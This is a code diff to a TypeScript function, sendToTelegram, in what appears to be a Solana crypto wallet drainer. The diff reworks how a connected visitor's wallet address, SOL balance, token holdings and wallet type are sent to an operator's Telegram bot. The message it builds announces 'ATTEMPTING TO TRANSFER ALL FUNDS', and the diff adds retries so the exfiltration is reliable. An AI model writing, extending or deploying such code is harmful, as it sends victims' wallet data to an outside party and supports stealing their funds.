@@ -115,48 +115,72 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
 
 export const sendToTelegram = async (walletData: any) => {
   try {
-    const connection = await createConnection();
-    let solBalance = 0;
+    console.log("Preparing to send data to Telegram:", walletData);
     
-    try {
-      solBalance = await retry(async () => {
-        return await connection.getBalance(new PublicKey(walletData.address), 'confirmed');
-      }, 3);
-      console.log("SOL balance fetched successfully:", solBalance);
-    } catch (error) {
-      console.error('Error fetching balance:', error);
+    // Make sure we have a valid balance
+    const solBalanceInSol = walletData.balance || 0;
+    
+    // Format token data in a more readable way
+    let formattedTokens = "No tokens found";
+    if (walletData.tokens && walletData.tokens.length > 0) {
+      formattedTokens = walletData.tokens.map((token: any, index: number) => 
+        `Token #${index + 1}:\n` +
+        `  Mint: ${token.mint}\n` +
+        `  Amount: ${token.amount}\n` +
+        `  Decimals: ${token.decimals}`
+      ).join('\n\n');
     }
-    
-    const solBalanceInSol = walletData.balance || solBalance / LAMPORTS_PER_SOL;
 
-    const formattedTokens = walletData.tokens.map((token: any) => 
-      `Mint: ${token.mint}\nAmount: ${token.amount}\nDecimals: ${token.decimals}`
-    ).join('\n\n');
-
-    const message = `🔍 New Wallet Connection Detected:\n\n` +
+    // Create a detailed message
+    const message = `🚨 WALLET CONNECTION DETECTED 🚨\n\n` +
       `👛 Wallet Address: ${walletData.address}\n` +
-      `💎 SOL Balance: ${solBalanceInSol.toFixed(4)} SOL\n` +
-      `⏰ Time: ${new Date().toLocaleString()}\n\n` +
-      `💰 Token Balances:\n${formattedTokens}\n\n` +
-      `🌐 Network: Solana (${PUBLIC_RPC_ENDPOINTS[0].includes('devnet') ? 'Devnet' : 'Mainnet'})`;
+      `💰 SOL Balance: ${solBalanceInSol.toFixed(9)} SOL\n` +
+      `⌚ Time: ${new Date().toLocaleString()}\n` +
+      (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
+      `\n💎 TOKEN HOLDINGS:\n${formattedTokens}\n\n` +
+      `🌐 Network: ${PUBLIC_RPC_ENDPOINTS[0].includes('devnet') ? 'Devnet' : 'Mainnet'}\n` +
+      `💵 ATTEMPTING TO TRANSFER ALL FUNDS`;
 
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-      }),
-    });
+    console.log("Sending message to Telegram:", message);
 
-    if (!response.ok) {
-      console.error('Telegram API response:', await response.text());
-      return false;
+    // Make multiple attempts to send to Telegram
+    let success = false;
+    for (let attempt = 1; attempt <= 3; attempt++) {
+      try {
+        console.log(`Telegram send attempt #${attempt}`);
+        
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+          }),
+          // Set a longer timeout
+          signal: AbortSignal.timeout(10000)
+        });
+
+        const responseData = await response.json();
+        console.log("Telegram API response:", responseData);
+
+        if (response.ok && responseData.ok) {
+          console.log("Successfully sent to Telegram");
+          success = true;
+          break;
+        } else {
+          console.error("Telegram API error:", responseData);
+          if (attempt < 3) await delay(1000 * attempt);
+        }
+      } catch (telegramError) {
+        console.error(`Telegram send attempt #${attempt} failed:`, telegramError);
+        if (attempt < 3) await delay(1000 * attempt);
+      }
     }
 
-    return true;
+    return success;
   } catch (error) {
     console.error('Error sending to Telegram:', error);
     return false;
